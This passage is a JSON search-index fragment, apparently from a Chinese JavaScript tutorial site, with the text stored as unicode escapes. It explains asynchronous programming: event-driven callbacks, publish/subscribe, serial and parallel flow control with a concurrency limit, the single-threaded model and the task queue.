\u53e6\u4e00\u79cd\u601d\u8def\u662f\u91c7\u7528\u4e8b\u4ef6\u9a71\u52a8\u6a21\u5f0f\u3002\u5f02\u6b65\u4efb\u52a1\u7684\u6267\u884c\u4e0d\u53d6\u51b3\u4e8e\u4ee3\u7801\u7684\u987a\u5e8f\uff0c\u800c\u53d6\u51b3\u4e8e\u67d0\u4e2a\u4e8b\u4ef6\u662f\u5426\u53d1\u751f\u3002 \u8fd8\u662f\u4ee5 f1 \u548c f2 \u4e3a\u4f8b\u3002\u9996\u5148\uff0c\u4e3a f1 \u7ed1\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\uff08\u8fd9\u91cc\u91c7\u7528\u7684 jQuery \u7684 \u5199\u6cd5 \uff09\u3002 1 f1 . on ( 'done' , f2 ); \u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\uff0c\u5f53 f1 \u53d1\u751f done \u4e8b\u4ef6\uff0c\u5c31\u6267\u884c f2 \u3002\u7136\u540e\uff0c\u5bf9 f1 \u8fdb\u884c\u6539\u5199\uff1a 1 2 3 4 5 6 function f1 () { setTimeout ( function () { // ... f1 . trigger ( 'done' ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f1.trigger('done') \u8868\u793a\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u7acb\u5373\u89e6\u53d1 done \u4e8b\u4ef6\uff0c\u4ece\u800c\u5f00\u59cb\u6267\u884c f2 \u3002 \u8fd9\u79cd\u65b9\u6cd5\u7684\u4f18\u70b9\u662f\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u53ef\u4ee5\u7ed1\u5b9a\u591a\u4e2a\u4e8b\u4ef6\uff0c\u6bcf\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u800c\u4e14\u53ef\u4ee5\u201c \u53bb\u8026\u5408 \u201d\uff08decoupling\uff09\uff0c\u6709\u5229\u4e8e\u5b9e\u73b0\u6a21\u5757\u5316\u3002\u7f3a\u70b9\u662f\u6574\u4e2a\u7a0b\u5e8f\u90fd\u8981\u53d8\u6210\u4e8b\u4ef6\u9a71\u52a8\u578b\uff0c\u8fd0\u884c\u6d41\u7a0b\u4f1a\u53d8\u5f97\u5f88\u4e0d\u6e05\u6670\u3002\u9605\u8bfb\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5f88\u96be\u770b\u51fa\u4e3b\u6d41\u7a0b\u3002 \u53d1\u5e03/\u8ba2\u9605 \u00b6 \u4e8b\u4ef6\u5b8c\u5168\u53ef\u4ee5\u7406\u89e3\u6210\u201c\u4fe1\u53f7\u201d\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u201c\u4fe1\u53f7\u4e2d\u5fc3\u201d\uff0c\u67d0\u4e2a\u4efb\u52a1\u6267\u884c\u5b8c\u6210\uff0c\u5c31\u5411\u4fe1\u53f7\u4e2d\u5fc3\u201c\u53d1\u5e03\u201d\uff08publish\uff09\u4e00\u4e2a\u4fe1\u53f7\uff0c\u5176\u4ed6\u4efb\u52a1\u53ef\u4ee5\u5411\u4fe1\u53f7\u4e2d\u5fc3\u201c\u8ba2\u9605\u201d\uff08subscribe\uff09\u8fd9\u4e2a\u4fe1\u53f7\uff0c\u4ece\u800c\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u81ea\u5df1\u53ef\u4ee5\u5f00\u59cb\u6267\u884c\u3002\u8fd9\u5c31\u53eb\u505a\u201d \u53d1\u5e03/\u8ba2\u9605\u6a21\u5f0f \u201d\uff08publish-subscribe pattern\uff09\uff0c\u53c8\u79f0\u201c \u89c2\u5bdf\u8005\u6a21\u5f0f \u201d\uff08observer pattern\uff09\u3002 \u8fd9\u4e2a\u6a21\u5f0f\u6709\u591a\u79cd \u5b9e\u73b0 \uff0c\u4e0b\u9762\u91c7\u7528\u7684\u662f Ben Alman \u7684 Tiny Pub/Sub \uff0c\u8fd9\u662f jQuery \u7684\u4e00\u4e2a\u63d2\u4ef6\u3002 \u9996\u5148\uff0c f2 \u5411\u4fe1\u53f7\u4e2d\u5fc3 jQuery \u8ba2\u9605 done \u4fe1\u53f7\u3002 1 jQuery . subscribe ( 'done' , f2 ); \u7136\u540e\uff0c f1 \u8fdb\u884c\u5982\u4e0b\u6539\u5199\u3002 1 2 3 4 5 6 function f1 () { setTimeout ( function () { // ... jQuery . publish ( 'done' ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c jQuery.publish('done') \u7684\u610f\u601d\u662f\uff0c f1 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u5411\u4fe1\u53f7\u4e2d\u5fc3 jQuery \u53d1\u5e03 done \u4fe1\u53f7\uff0c\u4ece\u800c\u5f15\u53d1 f2 \u7684\u6267\u884c\u3002 f2 \u5b8c\u6210\u6267\u884c\u540e\uff0c\u53ef\u4ee5\u53d6\u6d88\u8ba2\u9605\uff08unsubscribe\uff09\u3002 1 jQuery . unsubscribe ( 'done' , f2 ); \u8fd9\u79cd\u65b9\u6cd5\u7684\u6027\u8d28\u4e0e\u201c\u4e8b\u4ef6\u76d1\u542c\u201d\u7c7b\u4f3c\uff0c\u4f46\u662f\u660e\u663e\u4f18\u4e8e\u540e\u8005\u3002\u56e0\u4e3a\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u201c\u6d88\u606f\u4e2d\u5fc3\u201d\uff0c\u4e86\u89e3\u5b58\u5728\u591a\u5c11\u4fe1\u53f7\u3001\u6bcf\u4e2a\u4fe1\u53f7\u6709\u591a\u5c11\u8ba2\u9605\u8005\uff0c\u4ece\u800c\u76d1\u63a7\u7a0b\u5e8f\u7684\u8fd0\u884c\u3002 \u5f02\u6b65\u64cd\u4f5c\u7684\u6d41\u7a0b\u63a7\u5236 \u00b6 \u5982\u679c\u6709\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u5c31\u5b58\u5728\u4e00\u4e2a\u6d41\u7a0b\u63a7\u5236\u7684\u95ee\u9898\uff1a\u5982\u4f55\u786e\u5b9a\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u7684\u987a\u5e8f\uff0c\u4ee5\u53ca\u5982\u4f55\u4fdd\u8bc1\u9075\u5b88\u8fd9\u79cd\u987a\u5e8f\u3002 1 2 3 4 function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } \u4e0a\u9762\u4ee3\u7801\u7684 async \u51fd\u6570\u662f\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u975e\u5e38\u8017\u65f6\uff0c\u6bcf\u6b21\u6267\u884c\u9700\u89811\u79d2\u624d\u80fd\u5b8c\u6210\uff0c\u7136\u540e\u518d\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002 \u5982\u679c\u6709\u516d\u4e2a\u8fd9\u6837\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u9700\u8981\u5168\u90e8\u5b8c\u6210\u540e\uff0c\u624d\u80fd\u6267\u884c\u6700\u540e\u7684 final \u51fd\u6570\u3002\u8bf7\u95ee\u5e94\u8be5\u5982\u4f55\u5b89\u6392\u64cd\u4f5c\u6d41\u7a0b\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } async ( 1 , function ( value ) { async ( 2 , function ( value ) { async ( 3 , function ( value ) { async ( 4 , function ( value ) { async ( 5 , function ( value ) { async ( 6 , final ); }); }); }); }); }); // \u53c2\u6570\u4e3a 1 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 2 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 3 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 4 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 5 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u53c2\u6570\u4e3a 6 , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c // \u5b8c\u6210: 12 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u516d\u4e2a\u56de\u8c03\u51fd\u6570\u7684\u5d4c\u5957\uff0c\u4e0d\u4ec5\u5199\u8d77\u6765\u9ebb\u70e6\uff0c\u5bb9\u6613\u51fa\u9519\uff0c\u800c\u4e14\u96be\u4ee5\u7ef4\u62a4\u3002 \u4e32\u884c\u6267\u884c \u00b6 \u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a\u6d41\u7a0b\u63a7\u5236\u51fd\u6570\uff0c\u8ba9\u5b83\u6765\u63a7\u5236\u5f02\u6b65\u4efb\u52a1\uff0c\u4e00\u4e2a\u4efb\u52a1\u5b8c\u6210\u4ee5\u540e\uff0c\u518d\u6267\u884c\u53e6\u4e00\u4e2a\u3002\u8fd9\u5c31\u53eb\u4e32\u884c\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } function series ( item ) { if ( item ) { async ( item , function ( result ) { results . push ( result ); return series ( items . shift ()); }); } else { return final ( results [ results . length - 1 ]); } } series ( items . shift ()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 series \u5c31\u662f\u4e32\u884c\u51fd\u6570\uff0c\u5b83\u4f1a\u4f9d\u6b21\u6267\u884c\u5f02\u6b65\u4efb\u52a1\uff0c\u6240\u6709\u4efb\u52a1\u90fd\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u6267\u884c final \u51fd\u6570\u3002 items \u6570\u7ec4\u4fdd\u5b58\u6bcf\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u7684\u53c2\u6570\uff0c results \u6570\u7ec4\u4fdd\u5b58\u6bcf\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u7684\u8fd0\u884c\u7ed3\u679c\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u5199\u6cd5\u9700\u8981\u516d\u79d2\uff0c\u624d\u80fd\u5b8c\u6210\u6574\u4e2a\u811a\u672c\u3002 \u5e76\u884c\u6267\u884c \u00b6 \u6d41\u7a0b\u63a7\u5236\u51fd\u6570\u4e5f\u53ef\u4ee5\u662f\u5e76\u884c\u6267\u884c\uff0c\u5373\u6240\u6709\u5f02\u6b65\u4efb\u52a1\u540c\u65f6\u6267\u884c\uff0c\u7b49\u5230\u5168\u90e8\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u6267\u884c final \u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } items . forEach ( function ( item ) { async ( item , function ( result ){ results . push ( result ); if ( results . length === items . length ) { final ( results [ results . length - 1 ]); } }) }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c forEach \u65b9\u6cd5\u4f1a\u540c\u65f6\u53d1\u8d77\u516d\u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u7b49\u5230\u5b83\u4eec\u5168\u90e8\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u4f1a\u6267\u884c final \u51fd\u6570\u3002 \u76f8\u6bd4\u800c\u8a00\uff0c\u4e0a\u9762\u7684\u5199\u6cd5\u53ea\u8981\u4e00\u79d2\uff0c\u5c31\u80fd\u5b8c\u6210\u6574\u4e2a\u811a\u672c\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5e76\u884c\u6267\u884c\u7684\u6548\u7387\u8f83\u9ad8\uff0c\u6bd4\u8d77\u4e32\u884c\u6267\u884c\u4e00\u6b21\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\uff0c\u8f83\u4e3a\u8282\u7ea6\u65f6\u95f4\u3002\u4f46\u662f\u95ee\u9898\u5728\u4e8e\u5982\u679c\u5e76\u884c\u7684\u4efb\u52a1\u8f83\u591a\uff0c\u5f88\u5bb9\u6613\u8017\u5c3d\u7cfb\u7edf\u8d44\u6e90\uff0c\u62d6\u6162\u8fd0\u884c\u901f\u5ea6\u3002\u56e0\u6b64\u6709\u4e86\u7b2c\u4e09\u79cd\u6d41\u7a0b\u63a7\u5236\u65b9\u5f0f\u3002 \u5e76\u884c\u4e0e\u4e32\u884c\u7684\u7ed3\u5408 \u00b6 \u6240\u8c13\u5e76\u884c\u4e0e\u4e32\u884c\u7684\u7ed3\u5408\uff0c\u5c31\u662f\u8bbe\u7f6e\u4e00\u4e2a\u95e8\u69db\uff0c\u6bcf\u6b21\u6700\u591a\u53ea\u80fd\u5e76\u884c\u6267\u884c n \u4e2a\u5f02\u6b65\u4efb\u52a1\uff0c\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u8fc7\u5206\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 var items = [ 1 , 2 , 3 , 4 , 5 , 6 ]; var results = []; var running = 0 ; var limit = 2 ; function async ( arg , callback ) { console . log ( '\u53c2\u6570\u4e3a ' + arg + ' , 1\u79d2\u540e\u8fd4\u56de\u7ed3\u679c' ); setTimeout ( function () { callback ( arg * 2 ); }, 1000 ); } function final ( value ) { console . log ( '\u5b8c\u6210: ' , value ); } function launcher () { while ( running < limit && items . length > 0 ) { var item = items . shift (); async ( item , function ( result ) { results . push ( result ); running -- ; if ( items . length > 0 ) { launcher (); } else if ( running == 0 ) { final ( results ); } }); running ++ ; } } launcher (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u591a\u53ea\u80fd\u540c\u65f6\u8fd0\u884c\u4e24\u4e2a\u5f02\u6b65\u4efb\u52a1\u3002\u53d8\u91cf running \u8bb0\u5f55\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\uff0c\u53ea\u8981\u4f4e\u4e8e\u95e8\u69db\u503c\uff0c\u5c31\u518d\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u4efb\u52a1\uff0c\u5982\u679c\u7b49\u4e8e 0 \uff0c\u5c31\u8868\u793a\u6240\u6709\u4efb\u52a1\u90fd\u6267\u884c\u5b8c\u4e86\uff0c\u8fd9\u65f6\u5c31\u6267\u884c final \u51fd\u6570\u3002 \u8fd9\u6bb5\u4ee3\u7801\u9700\u8981\u4e09\u79d2\u5b8c\u6210\u6574\u4e2a\u811a\u672c\uff0c\u5904\u5728\u4e32\u884c\u6267\u884c\u548c\u5e76\u884c\u6267\u884c\u4e4b\u95f4\u3002\u901a\u8fc7\u8c03\u8282 limit \u53d8\u91cf\uff0c\u8fbe\u5230\u6548\u7387\u548c\u8d44\u6e90\u7684\u6700\u4f73\u5e73\u8861\u3002","title":"\u6982\u8ff0"},{"location":"async/general/#_1","text":"","title":"\u5f02\u6b65\u64cd\u4f5c\u6982\u8ff0"},{"location":"async/general/#_2","text":"\u5355\u7ebf\u7a0b\u6a21\u578b\u6307\u7684\u662f\uff0cJavaScript \u53ea\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u540c\u65f6\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\uff0c\u5176\u4ed6\u4efb\u52a1\u90fd\u5fc5\u987b\u5728\u540e\u9762\u6392\u961f\u7b49\u5f85\u3002 \u6ce8\u610f\uff0cJavaScript \u53ea\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\uff0c\u4e0d\u4ee3\u8868 JavaScript \u5f15\u64ce\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0cJavaScript \u5f15\u64ce\u6709\u591a\u4e2a\u7ebf\u7a0b\uff0c\u5355\u4e2a\u811a\u672c\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\uff08\u79f0\u4e3a\u4e3b\u7ebf\u7a0b\uff09\uff0c\u5176\u4ed6\u7ebf\u7a0b\u90fd\u662f\u5728\u540e\u53f0\u914d\u5408\u3002 JavaScript \u4e4b\u6240\u4ee5\u91c7\u7528\u5355\u7ebf\u7a0b\uff0c\u800c\u4e0d\u662f\u591a\u7ebf\u7a0b\uff0c\u8ddf\u5386\u53f2\u6709\u5173\u7cfb\u3002JavaScript \u4ece\u8bde\u751f\u8d77\u5c31\u662f\u5355\u7ebf\u7a0b\uff0c\u539f\u56e0\u662f\u4e0d\u60f3\u8ba9\u6d4f\u89c8\u5668\u53d8\u5f97\u592a\u590d\u6742\uff0c\u56e0\u4e3a\u591a\u7ebf\u7a0b\u9700\u8981\u5171\u4eab\u8d44\u6e90\u3001\u4e14\u6709\u53ef\u80fd\u4fee\u6539\u5f7c\u6b64\u7684\u8fd0\u884c\u7ed3\u679c\uff0c\u5bf9\u4e8e\u4e00\u79cd\u7f51\u9875\u811a\u672c\u8bed\u8a00\u6765\u8bf4\uff0c\u8fd9\u5c31\u592a\u590d\u6742\u4e86\u3002\u5982\u679c JavaScript \u540c\u65f6\u6709\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u5728\u7f51\u9875 DOM \u8282\u70b9\u4e0a\u6dfb\u52a0\u5185\u5bb9\uff0c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5220\u9664\u4e86\u8fd9\u4e2a\u8282\u70b9\uff0c\u8fd9\u65f6\u6d4f\u89c8\u5668\u5e94\u8be5\u4ee5\u54ea\u4e2a\u7ebf\u7a0b\u4e3a\u51c6\uff1f\u662f\u4e0d\u662f\u8fd8\u8981\u6709\u9501\u673a\u5236\uff1f\u6240\u4ee5\uff0c\u4e3a\u4e86\u907f\u514d\u590d\u6742\u6027\uff0cJavaScript \u4e00\u5f00\u59cb\u5c31\u662f\u5355\u7ebf\u7a0b\uff0c\u8fd9\u5df2\u7ecf\u6210\u4e86\u8fd9\u95e8\u8bed\u8a00\u7684\u6838\u5fc3\u7279\u5f81\uff0c\u5c06\u6765\u4e5f\u4e0d\u4f1a\u6539\u53d8\u3002 \u8fd9\u79cd\u6a21\u5f0f\u7684\u597d\u5904\u662f\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u6267\u884c\u73af\u5883\u76f8\u5bf9\u5355\u7eaf\uff1b\u574f\u5904\u662f\u53ea\u8981\u6709\u4e00\u4e2a\u4efb\u52a1\u8017\u65f6\u5f88\u957f\uff0c\u540e\u9762\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u6392\u961f\u7b49\u7740\uff0c\u4f1a\u62d6\u5ef6\u6574\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u3002\u5e38\u89c1\u7684\u6d4f\u89c8\u5668\u65e0\u54cd\u5e94\uff08\u5047\u6b7b\uff09\uff0c\u5f80\u5f80\u5c31\u662f\u56e0\u4e3a\u67d0\u4e00\u6bb5 JavaScript \u4ee3\u7801\u957f\u65f6\u95f4\u8fd0\u884c\uff08\u6bd4\u5982\u6b7b\u5faa\u73af\uff09\uff0c\u5bfc\u81f4\u6574\u4e2a\u9875\u9762\u5361\u5728\u8fd9\u4e2a\u5730\u65b9\uff0c\u5176\u4ed6\u4efb\u52a1\u65e0\u6cd5\u6267\u884c\u3002JavaScript \u8bed\u8a00\u672c\u8eab\u5e76\u4e0d\u6162\uff0c\u6162\u7684\u662f\u8bfb\u5199\u5916\u90e8\u6570\u636e\uff0c\u6bd4\u5982\u7b49\u5f85 Ajax \u8bf7\u6c42\u8fd4\u56de\u7ed3\u679c\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u5bf9\u65b9\u670d\u52a1\u5668\u8fdf\u8fdf\u6ca1\u6709\u54cd\u5e94\uff0c\u6216\u8005\u7f51\u7edc\u4e0d\u901a\u7545\uff0c\u5c31\u4f1a\u5bfc\u81f4\u811a\u672c\u7684\u957f\u65f6\u95f4\u505c\u6ede\u3002 \u5982\u679c\u6392\u961f\u662f\u56e0\u4e3a\u8ba1\u7b97\u91cf\u5927\uff0cCPU \u5fd9\u4e0d\u8fc7\u6765\uff0c\u5012\u4e5f\u7b97\u4e86\uff0c\u4f46\u662f\u5f88\u591a\u65f6\u5019 CPU \u662f\u95f2\u7740\u7684\uff0c\u56e0\u4e3a IO \u64cd\u4f5c\uff08\u8f93\u5165\u8f93\u51fa\uff09\u5f88\u6162\uff08\u6bd4\u5982 Ajax \u64cd\u4f5c\u4ece\u7f51\u7edc\u8bfb\u53d6\u6570\u636e\uff09\uff0c\u4e0d\u5f97\u4e0d\u7b49\u7740\u7ed3\u679c\u51fa\u6765\uff0c\u518d\u5f80\u4e0b\u6267\u884c\u3002JavaScript \u8bed\u8a00\u7684\u8bbe\u8ba1\u8005\u610f\u8bc6\u5230\uff0c\u8fd9\u65f6 CPU \u5b8c\u5168\u53ef\u4ee5\u4e0d\u7ba1 IO \u64cd\u4f5c\uff0c\u6302\u8d77\u5904\u4e8e\u7b49\u5f85\u4e2d\u7684\u4efb\u52a1\uff0c\u5148\u8fd0\u884c\u6392\u5728\u540e\u9762\u7684\u4efb\u52a1\u3002\u7b49\u5230 IO \u64cd\u4f5c\u8fd4\u56de\u4e86\u7ed3\u679c\uff0c\u518d\u56de\u8fc7\u5934\uff0c\u628a\u6302\u8d77\u7684\u4efb\u52a1\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\u3002\u8fd9\u79cd\u673a\u5236\u5c31\u662f JavaScript \u5185\u90e8\u91c7\u7528\u7684\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u673a\u5236\uff08Event Loop\uff09\u3002 \u5355\u7ebf\u7a0b\u6a21\u578b\u867d\u7136\u5bf9 JavaScript \u6784\u6210\u4e86\u5f88\u5927\u7684\u9650\u5236\uff0c\u4f46\u4e5f\u56e0\u6b64\u4f7f\u5b83\u5177\u5907\u4e86\u5176\u4ed6\u8bed\u8a00\u4e0d\u5177\u5907\u7684\u4f18\u52bf\u3002\u5982\u679c\u7528\u5f97\u597d\uff0cJavaScript \u7a0b\u5e8f\u662f\u4e0d\u4f1a\u51fa\u73b0\u5835\u585e\u7684\uff0c\u8fd9\u5c31\u662f Node.js \u53ef\u4ee5\u7528\u5f88\u5c11\u7684\u8d44\u6e90\uff0c\u5e94\u4ed8\u5927\u6d41\u91cf\u8bbf\u95ee\u7684\u539f\u56e0\u3002 \u4e3a\u4e86\u5229\u7528\u591a\u6838 CPU \u7684\u8ba1\u7b97\u80fd\u529b\uff0cHTML5 \u63d0\u51fa Web Worker \u6807\u51c6\uff0c\u5141\u8bb8 JavaScript \u811a\u672c\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\uff0c\u4f46\u662f\u5b50\u7ebf\u7a0b\u5b8c\u5168\u53d7\u4e3b\u7ebf\u7a0b\u63a7\u5236\uff0c\u4e14\u4e0d\u5f97\u64cd\u4f5c DOM\u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u65b0\u6807\u51c6\u5e76\u6ca1\u6709\u6539\u53d8 JavaScript \u5355\u7ebf\u7a0b\u7684\u672c\u8d28\u3002","title":"\u5355\u7ebf\u7a0b\u6a21\u578b"},{"location":"async/general/#_3","text":"\u7a0b\u5e8f\u91cc\u9762\u6240\u6709\u7684\u4efb\u52a1\uff0c\u53ef\u4ee5\u5206\u6210\u4e24\u7c7b\uff1a\u540c\u6b65\u4efb\u52a1\uff08synchronous\uff09\u548c\u5f02\u6b65\u4efb\u52a1\uff08asynchronous\uff09\u3002 \u540c\u6b65\u4efb\u52a1\u662f\u90a3\u4e9b\u6ca1\u6709\u88ab\u5f15\u64ce\u6302\u8d77\u3001\u5728\u4e3b\u7ebf\u7a0b\u4e0a\u6392\u961f\u6267\u884c\u7684\u4efb\u52a1\u3002\u53ea\u6709\u524d\u4e00\u4e2a\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5\uff0c\u624d\u80fd\u6267\u884c\u540e\u4e00\u4e2a\u4efb\u52a1\u3002 \u5f02\u6b65\u4efb\u52a1\u662f\u90a3\u4e9b\u88ab\u5f15\u64ce\u653e\u5728\u4e00\u8fb9\uff0c\u4e0d\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u3001\u800c\u8fdb\u5165\u4efb\u52a1\u961f\u5217\u7684\u4efb\u52a1\u3002\u53ea\u6709\u5f15\u64ce\u8ba4\u4e3a\u67d0\u4e2a\u5f02\u6b65\u4efb\u52a1\u53ef\u4ee5\u6267\u884c\u4e86\uff08\u6bd4\u5982 Ajax \u64cd\u4f5c\u4ece\u670d\u52a1\u5668\u5f97\u5230\u4e86\u7ed3\u679c\uff09\uff0c\u8be5\u4efb\u52a1\uff08\u91c7\u7528\u56de\u8c03\u51fd\u6570\u7684\u5f62\u5f0f\uff09\u624d\u4f1a\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u6267\u884c\u3002\u6392\u5728\u5f02\u6b65\u4efb\u52a1\u540e\u9762\u7684\u4ee3\u7801\uff0c\u4e0d\u7528\u7b49\u5f85\u5f02\u6b65\u4efb\u52a1\u7ed3\u675f\u4f1a\u9a6c\u4e0a\u8fd0\u884c\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f02\u6b65\u4efb\u52a1\u4e0d\u5177\u6709\u201c\u5835\u585e\u201d\u6548\u5e94\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cAjax \u64cd\u4f5c\u53ef\u4ee5\u5f53\u4f5c\u540c\u6b65\u4efb\u52a1\u5904\u7406\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u5f02\u6b65\u4efb\u52a1\u5904\u7406\uff0c\u7531\u5f00\u53d1\u8005\u51b3\u5b9a\u3002\u5982\u679c\u662f\u540c\u6b65\u4efb\u52a1\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u7b49\u7740 Ajax \u64cd\u4f5c\u8fd4\u56de\u7ed3\u679c\uff0c\u518d\u5f80\u4e0b\u6267\u884c\uff1b\u5982\u679c\u662f\u5f02\u6b65\u4efb\u52a1\uff0c\u4e3b\u7ebf\u7a0b\u5728\u53d1\u51fa Ajax \u8bf7\u6c42\u4ee5\u540e\uff0c\u5c31\u76f4\u63a5\u5f80\u4e0b\u6267\u884c\uff0c\u7b49\u5230 Ajax \u64cd\u4f5c\u6709\u4e86\u7ed3\u679c\uff0c\u4e3b\u7ebf\u7a0b\u518d\u6267\u884c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002","title":"\u540c\u6b65\u4efb\u52a1\u548c\u5f02\u6b65\u4efb\u52a1"},{"location":"async/general/#_4","text":"JavaScript \u8fd0\u884c\u65f6\uff0c\u9664\u4e86\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u4e3b\u7ebf\u7a0b\uff0c\u5f15\u64ce\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u4efb\u52a1\u961f\u5217\uff08task queue\uff09\uff0c\u91cc\u9762\u662f\u5404\u79cd\u9700\u8981\u5f53\u524d\u7a0b\u5e8f\u5904\u7406\u7684\u5f02\u6b65\u4efb\u52a1\u3002\uff08\u5b9e\u9645\u4e0a\uff0c\u6839\u636e\u5f02\u6b65\u4efb\u52a1\u7684\u7c7b\u578b\uff0c\u5b58\u5728\u591a\u4e2a\u4efb\u52a1\u961f\u5217\u3002\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\uff0c\u8fd9\u91cc\u5047\u8bbe\u53ea\u5b58\u5728\u4e00\u4e2a\u961f\u5217\u3002\uff09 \u9996\u5148\uff0c\u4e3b\u7ebf\u7a0b\u4f1a\u53bb\u6267\u884c\u6240\u6709\u7684\u540c\u6b65\u4efb\u52a1\u3002\u7b49\u5230\u540c\u6b65\u4efb\u52a1\u5168\u90e8\u6267\u884c\u5b8c\uff0c\u5c31\u4f1a\u53bb\u770b\u4efb\u52a1\u961f\u5217\u91cc\u9762\u7684\u5f02\u6b65\u4efb\u52a1\u3002\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u90a3\u4e48\u5f02\u6b65\u4efb\u52a1\u5c31\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\uff0c\u8fd9\u65f6\u5b83\u5c31\u53d8\u6210\u540c\u6b65\u4efb\u52a1\u4e86\u3002\u7b49\u5230\u6267\u884c\u5b8c\uff0c\u4e0b\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u518d\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\u3002\u4e00\u65e6\u4efb\u52a1\u961f\u5217\u6e05\